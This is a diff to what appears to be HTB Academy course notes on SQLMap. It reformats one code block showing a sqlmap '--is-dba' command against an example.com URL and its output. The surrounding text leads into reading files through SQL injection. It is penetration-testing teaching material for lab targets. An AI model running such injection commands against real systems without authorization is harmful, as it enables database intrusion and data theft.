@@ -1854,8 +1854,26 @@ While we do not necessarily need to have database administrator privileges (DBA)
 
 To check whether we have DBA privileges with SQLMap, we can use the `--is-dba` option:
 
-        shellsession
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba         ___       __H__ ___ ___[)]_____ ___ ___  {1.4.11#stable} |_ -| . [)]     | .'| . | |___|_  ["]_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 17:31:55 /2020-11-19/ [17:31:55] [INFO] resuming back-end DBMS 'mysql' [17:31:55] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ...SNIP... current user is DBA: False [*] ending @ 17:31:56 /2020-11-19`
+```shell
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 17:31:55 /2020-11-19/
+
+[17:31:55] [INFO] resuming back-end DBMS 'mysql'
+[17:31:55] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+current user is DBA: False
+
+[*] ending @ 17:31:56 /2020-11-19
+```
 
 As we can see, if we test that on one of the previous exercises, we get `current user is DBA: False`, meaning that we do not have DBA access. If we tried to read a file using SQLMap, we would get something like:
 
